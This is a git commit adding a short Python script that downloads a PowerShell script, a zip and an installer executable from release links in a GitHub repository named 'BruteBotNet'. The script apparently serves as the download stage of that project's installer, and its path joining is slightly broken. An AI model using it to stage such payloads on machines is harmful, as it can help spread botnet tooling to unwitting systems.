f328d43f5562e1de5b23066b657328d308c6d825
AbdulazizDXT <143551117+AzizDXT@users.noreply.github.com>
2023-10-27 21:43:39 +0400

    Create DownloadInstallerFiles.py

---
+++ Installer/DownloadInstallerFiles.py
@@ -0,0 +1,24 @@
+import requests
+
+# قائمة بالروابط التي تحتوي على الملفات التي ترغب في تنزيلها
+urls = [
+    'https://github.com/AzizDXT/BruteBotNet/releases/download/V6.0/PYIN.ps1',
+    'https://github.com/AzizDXT/BruteBotNet/releases/download/V6.0/InstallerBN.zip',
+    'https://github.com/AzizDXT/BruteBotNet/releases/download/V6.0/Advanced.Installer.Architect.v13.2.exe'
+]
+
+# مجلد الوجهة الذي ترغب في حفظ الملفات فيه
+destination_folder = '.'
+
+# تكرار عبر الروابط وتنزيل الملفات
+for url in urls:
+    response = requests.get(url)
+    if response.status_code == 200:
+        # استخراج اسم الملف من عنوان الرابط
+        file_name = url.split('/')[-1]
+        file_path = destination_folder + file_name
+        with open(file_path, 'wb') as file:
+            file.write(response.content)
+        print(f'Download > {file_name}')
+    else:
+        print(f'No Downloaded {url}')
